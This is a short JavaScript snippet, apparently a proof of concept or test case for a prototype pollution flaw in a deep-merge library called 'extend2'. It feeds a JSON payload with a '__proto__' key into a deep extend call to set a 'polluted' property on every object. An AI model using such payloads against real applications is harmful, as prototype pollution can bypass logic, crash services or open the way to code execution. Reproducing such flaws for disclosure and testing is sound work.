const extend = require('./extend2@1.0.0');
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}')
extend(true, {}, payload);
